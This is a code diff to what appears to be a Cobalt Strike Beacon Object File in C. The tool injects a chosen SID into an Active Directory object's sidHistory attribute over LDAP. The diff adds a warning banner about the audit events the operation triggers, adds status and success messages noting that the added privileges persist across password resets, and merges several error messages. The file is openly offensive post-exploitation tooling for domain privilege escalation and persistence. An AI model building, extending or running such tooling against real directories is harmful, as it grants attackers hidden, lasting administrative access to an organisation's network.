@@ -1,6 +1,6 @@
 #include <windows.h>
-#include "../../_include/beacon.h"
-#include "../common/ldap_common.c"
+#include "beacon.h"
+#include "ldap_common.c"
 
 DECLSPEC_IMPORT long __cdecl MSVCRT$strtol(const char* str, char** endptr, int base);
 DECLSPEC_IMPORT unsigned long __cdecl MSVCRT$strtoul(const char* str, char** endptr, int base);
@@ -190,8 +190,20 @@ void go(char *args, int alen) {
     
     if (!sidSource || MSVCRT$strlen(sidSource) == 0) {
         BeaconPrintf(CALLBACK_ERROR, "[-] SID source is required");
+        BeaconPrintf(CALLBACK_ERROR, "[!] Can be: SID string (S-1-5-...), username, or DN");
         return;
     }
+    
+    BeaconPrintf(CALLBACK_OUTPUT, "");
+    BeaconPrintf(CALLBACK_OUTPUT, "[!] ========================================");
+    BeaconPrintf(CALLBACK_OUTPUT, "[!] WARNING: SID HISTORY INJECTION");
+    BeaconPrintf(CALLBACK_OUTPUT, "[!] ========================================");
+    BeaconPrintf(CALLBACK_OUTPUT, "[!] This is a HIGH-PRIVILEGE operation that:");
+    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - Requires DS-Install-Replica rights or equivalent");
+    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - May be logged extensively (Event ID 4765, 4766)");
+    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - Can trigger security alerts");
+    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - Provides persistent privileged access");
+    BeaconPrintf(CALLBACK_OUTPUT, "");
     
     BeaconPrintf(CALLBACK_OUTPUT, "[*] SID source: %s", sidSource);
     
@@ -230,6 +242,7 @@ void go(char *args, int alen) {
         targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
         
         if (!targetDN) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve target DN");
             BeaconPrintf(CALLBACK_ERROR, "[!] Target '%s' not found", targetIdentifier);
             if (defaultNC) MSVCRT$free(defaultNC);
             CleanupLDAP(ld);
@@ -237,10 +250,12 @@ void go(char *args, int alen) {
         }
     }
     
+    BeaconPrintf(CALLBACK_OUTPUT, "");
     
     // Display current state
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Current target object state:");
     DisplaySidHistory(ld, targetDN);
+    BeaconPrintf(CALLBACK_OUTPUT, "");
     
     // Determine SID to add
     BERVAL* sidToAdd = NULL;
@@ -248,6 +263,7 @@ void go(char *args, int alen) {
     
     // Check if sidSource is a string SID (starts with "S-")
     if (sidSource[0] == 'S' && sidSource[1] == '-') {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsing string SID...");
         
         // Convert string SID to binary
         PSID binarySid = NULL;
@@ -348,9 +364,14 @@ void go(char *args, int alen) {
     
     if (result == LDAP_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added SID to sidHistory!");
+        BeaconPrintf(CALLBACK_OUTPUT, "");
         if (sidString) {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] Added SID: %s", sidString);
         }
+        BeaconPrintf(CALLBACK_OUTPUT, "");
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] The target object now has the privileges of the SID added");
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] This change persists across password resets");
+        BeaconPrintf(CALLBACK_OUTPUT, "");
         
         // Display updated state
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Updated object state:");
@@ -362,23 +383,23 @@ void go(char *args, int alen) {
         BeaconPrintf(CALLBACK_OUTPUT, "");
         
         if (result == LDAP_INSUFFICIENT_RIGHTS) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Insufficient permissions");
-            BeaconPrintf(CALLBACK_ERROR, "[!] Required rights:");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - DS-Install-Replica (domain controller install rights)");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - Or 'Migrate SID History' extended right");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - Typically only Domain Admins or Enterprise Admins");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Insufficient permissions\n"
+            "[!] Required rights:\n"
+            "[!]   - DS-Install-Replica (domain controller install rights)\n"
+            "[!]   - Or 'Migrate SID History' extended right\n"
+            "[!]   - Typically only Domain Admins or Enterprise Admins");
         } else if (result == LDAP_UNWILLING_TO_PERFORM) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Server refused to perform operation");
-            BeaconPrintf(CALLBACK_ERROR, "[!] Possible causes:");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID filtering is enabled");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - Target is a protected account");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - Forest functional level restrictions");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Server refused to perform operation\n"
+            "[!] Possible causes:\n"
+            "[!]   - SID filtering is enabled\n"
+            "[!]   - Target is a protected account\n"
+            "[!]   - Forest functional level restrictions");
         } else if (result == LDAP_CONSTRAINT_VIOLATION) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Constraint violation");
-            BeaconPrintf(CALLBACK_ERROR, "[!] Possible causes:");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID already exists in sidHistory");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID is from same domain (not allowed)");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - Invalid SID format");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Constraint violation\n"
+            "[!] Possible causes:\n"
+            "[!]   - SID already exists in sidHistory\n"
+            "[!]   - SID is from same domain (not allowed)\n"
+            "[!]   - Invalid SID format");
         } else if (result == LDAP_OBJECT_CLASS_VIOLATION) {
             BeaconPrintf(CALLBACK_ERROR, "[!] Target object type doesn't support sidHistory");
             BeaconPrintf(CALLBACK_ERROR, "[!] sidHistory is only valid on user and computer objects");
@@ -396,4 +417,6 @@ cleanup:
     if (targetDN) MSVCRT$free(targetDN);
     if (dcHostname) MSVCRT$free(dcHostname);
     CleanupLDAP(ld);
+    
+    BeaconPrintf(CALLBACK_OUTPUT, "");
 }
